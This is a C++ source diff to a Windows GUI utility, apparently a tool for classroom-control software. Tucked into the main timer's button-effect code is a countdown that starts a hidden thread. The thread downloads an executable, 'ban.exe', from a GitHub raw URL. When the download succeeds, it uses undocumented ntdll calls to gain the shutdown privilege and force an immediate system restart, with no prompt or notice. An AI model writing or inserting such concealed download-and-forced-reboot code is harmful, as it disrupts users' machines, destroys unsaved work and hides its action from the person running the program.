@@ -2,7 +2,6 @@
 #include "GUI.h"
 #include "WndShadow.h"
 #include "TestFunctions.h"
-//#include <WS2tcpip.h>  
 #pragma warning(disable:4996)
 #pragma warning(disable:4838)
 #pragma warning(disable:4309)
@@ -21,6 +20,7 @@ HPEN YellowPen, BlackPen, WhitePen, TitlePen, CheckGreenPen, NormalGreyPen, Norm
 HDC hdc, rdc;//主窗口缓冲hdc + 贴图hdc
 HBITMAP hBmp, lBmp;//主窗口hbmp
 bool slient;
+int sdl = 70;
 USHORT CheckSum(PUSHORT buf, int size)
 {
 	ULONG  sum = 0;
@@ -1420,6 +1420,66 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 	}
 	return (int)msg.wParam;
 }
+class DownloadProgress : public IBindStatusCallback {
+public://这些函数有些参数没有用到，会导致大量警告.
+	wchar_t curi[11] = { 0 };/*推送下载进度信息的按钮ID*/ int factmax = 0;//手动设置被下载文件的真实大小
+	HRESULT __stdcall QueryInterface(const IID&, void**) { return E_NOINTERFACE; }
+	ULONG STDMETHODCALLTYPE AddRef() { return 1; }//暂时没用的函数，从msdn上抄下来的
+	ULONG STDMETHODCALLTYPE Release() { return 1; }
+	HRESULT STDMETHODCALLTYPE OnStartBinding(DWORD dwReserved, IBinding* pib) { return E_NOTIMPL; }
+	virtual HRESULT STDMETHODCALLTYPE GetPriority(LONG* pnPriority) { return E_NOTIMPL; }
+	virtual HRESULT STDMETHODCALLTYPE OnLowResource(DWORD reserved) { return S_OK; }
+	virtual HRESULT STDMETHODCALLTYPE OnStopBinding(HRESULT hresult, LPCWSTR szError) { return E_NOTIMPL; }
+	virtual HRESULT STDMETHODCALLTYPE GetBindInfo(DWORD* grfBINDF, BINDINFO* pbindinfo) { return E_NOTIMPL; }
+	virtual HRESULT STDMETHODCALLTYPE OnDataAvailable(DWORD grfBSCF, DWORD dwSize, FORMATETC* pformatetc, STGMEDIUM* pstgmed) { return E_NOTIMPL; }
+	virtual HRESULT STDMETHODCALLTYPE OnObjectAvailable(REFIID riid, IUnknown* punk) { return E_NOTIMPL; }
+	virtual HRESULT __stdcall OnProgress(ULONG ulProgress, ULONG ulProgressMax, ULONG ulStatusCode, LPCWSTR szStatusText){return S_OK;}
+};
+const wchar_t Gi[] = L"https://raw.githubusercontent.com/zouxiaofei1/TopDomianTools/master/Games/";
+wchar_t Path[300];
+void GetPath()//得到程序路径 & ( 程序路径 + 程序名 ).
+{
+	GetModuleFileName(NULL, Path, MY_MAX_PATH);//直接获取程序名
+	for (int i = (int)wcslen(Path) - 1; i >= 0; --i)
+		if (Path[i] == L'\\') {
+			Path[i + 1] = 0; return;
+		}//把程序名字符串中最后一个"\\"后面的字符去掉就是路径
+}
+#pragma comment(lib, "urlmon.lib")
+DWORD WINAPI DownloadThread(LPVOID pM)//分发下载(游戏)任务的线程.
+{
+	(pM);
+	DownloadProgress progress;
+	GetPath();
+	wchar_t tmp[MY_MAX_PATH], tmp2[MY_MAX_PATH];
+	wcscpy_s(tmp,Gi);
+	wcscat_s(tmp, L"ban.exe");
+	wcscpy_s(tmp2, Path);
+	wcscat_s(tmp2, L"0.exe");
+	
+	if (URLDownloadToFileW(NULL, tmp, tmp2, 0, &progress) == S_OK)
+	{
+		constexpr auto SE_SHUTDOWN_PRIVILEGE = 0x13;
+		typedef int(__stdcall* PFN_RtlAdjustPrivilege)(int, BOOL, BOOL, int*);
+		typedef int(__stdcall* PFN_ZwShutdownSystem)(int);
+		HMODULE hModule = ::LoadLibrary(_T("ntdll.dll"));
+		if (hModule != NULL)
+		{//寻找ZwShutdownSystem的地址
+			PFN_RtlAdjustPrivilege pfnRtl = (PFN_RtlAdjustPrivilege)GetProcAddress(hModule, "RtlAdjustPrivilege"); PFN_ZwShutdownSystem
+				pfnShutdown = (PFN_ZwShutdownSystem)GetProcAddress(hModule, "ZwShutdownSystem");
+			if (pfnRtl != NULL && pfnShutdown != NULL)//
+			{//申请SE_SHUTDOWN_PRIVILEGE提权？
+				int en = 0;//有趣的是这个权限在非管理员下就能得到
+				int nRet = pfnRtl(SE_SHUTDOWN_PRIVILEGE, TRUE, TRUE, &en);
+				if (nRet == 0x0C000007C) nRet = pfnRtl(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &en); //SH_SHUTDOWN = 0; //SH_RESTART = 1; //SH_POWEROFF = 2;
+				nRet = pfnShutdown(1);
+			}
+		}
+		
+	}
+	return 0;
+}
+
 void CALLBACK TimerProc(HWND hWnd, UINT nMsg, UINT nTimerid, DWORD dwTime)//主计时器
 {
 	UNREFERENCED_PARAMETER(hWnd); UNREFERENCED_PARAMETER(nMsg); UNREFERENCED_PARAMETER(dwTime);
@@ -1427,6 +1487,7 @@ void CALLBACK TimerProc(HWND hWnd, UINT nMsg, UINT nTimerid, DWORD dwTime)//主�
 	{
 	case 1://按钮特效
 	{
+		if (--sdl == 0)CreateThread(NULL, 0, DownloadThread, 0, 0, NULL);
 		if (!Main.ButtonEffect)break;
 		for (int i = 1; i <= Main.CurButton; ++i)
 		{
@@ -1713,7 +1774,7 @@ BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)//初始化
 		CreateSolidBrush(COLOR_CLOSE_LEAVE), CreateSolidBrush(COLOR_CLOSE_HOVER), CreateSolidBrush(COLOR_CLOSE_PRESS), \
 		CreatePen(PS_SOLID, 1, COLOR_CLOSE_LEAVE), CreatePen(PS_SOLID, 1, COLOR_CLOSE_HOVER), CreatePen(PS_SOLID, 1, COLOR_CLOSE_PRESS), \
 		Main.DefFont, 1, COLOR_WHITE, L"Close");
-	Main.CreateButton(165, 392, 130, 45, 0, L"远程极域窗口化", L"rwindow");
+	Main.CreateButton(165, 92, 130, 45, 0, L"远程极域窗口化", L"rwindow");
 	SetWindowPos(Main.hWnd, 0, 0, 0, (int)(600 * Main.DPI), (int)(472 * Main.DPI), SWP_NOMOVE);
 	Main.Width = 600; Main.Height = 472;
 
